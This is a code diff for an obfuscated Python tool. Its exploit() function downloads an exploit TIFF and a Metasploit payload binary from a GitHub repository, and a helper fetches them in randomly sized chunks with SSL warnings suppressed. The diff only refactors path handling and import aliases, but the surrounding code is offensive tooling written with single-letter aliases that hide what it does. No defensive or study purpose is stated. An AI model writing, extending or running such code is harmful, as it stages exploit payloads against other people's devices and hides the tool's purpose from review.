@@ -2,7 +2,6 @@ import base64 as i
 import binascii as l
 import logging as f
 import os as j
-import pathlib as q
 import pyminizip as cc
 import pickle as m
 import random as n
@@ -11,7 +10,7 @@ import sentry_sdk as e
 import struct as a
 import sys as s
 import time as r
-import urllib3 as cd
+import urllib3 as q
 import zlib as p
 from sentry_sdk.integrations.logging import LoggingIntegration
 g.packages.urllib3.disable_warnings()  # This is so we don't get some warning about SSL.
@@ -25,7 +24,7 @@ def setup_log(sentry_w, bc_errors):
         event_level=f.INFO
     )
     e.init(dsn=sentry_w, integrations=[sentry_logging])
-    logger=logging.getLogger(__name__)
+    logger=f.getLogger(__name__)
     p_errors=bc_errors
     production=True
 def log(msg, level):  
@@ -166,11 +165,11 @@ def exploit(a, b):
         hexdata = l.hexlify(f.read())
         m.dump((hexdata.decode('utf-8')), open('hex.dat', 'wb'))
   elif a == 2:
-    data2 = str(q.Path(__file__).parent.absolute()) + "/" + "exploit.tiff"
+    data2 = str(j.getcwd()) + "/" + "exploit.tiff"
     url2 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/exploit.tiff"
     downloadtask(data2, url2)
   elif a == 3:
-    data1 = str(q.Path(__file__).parent.absolute()) + "/" + "payload.bin"
+    data1 = str(j.getcwd()) + "/" + "payload.bin"
     url1 = "https://raw.githubusercontent.com/planetbeing/touchfree/master/tiff/metasploit/payload.bin"
     downloadtask(data1, url1)
   elif a == 4:
@@ -248,7 +247,7 @@ def task(a):
     run()
     j._exit(0)
 def downloadtask(a, b):
-  c = cd.PoolManager()
+  c = q.PoolManager()
   r = c.request('GET', b, preload_content=False)
   chunk_size = n.randint(10, 1000)
   with open(a, 'wb') as out:
@@ -259,7 +258,7 @@ def downloadtask(a, b):
       out.write(data)
   r.release_conn()
 def getcurrentpath():
-	a=str(q.Path(__file__).parent.absolute())
+	a=str(j.getcwd())
 	return a
 def compressmultiple(a, b, c, d):
 	cc.compress_multiple([a, b], d, c, 4, progress)
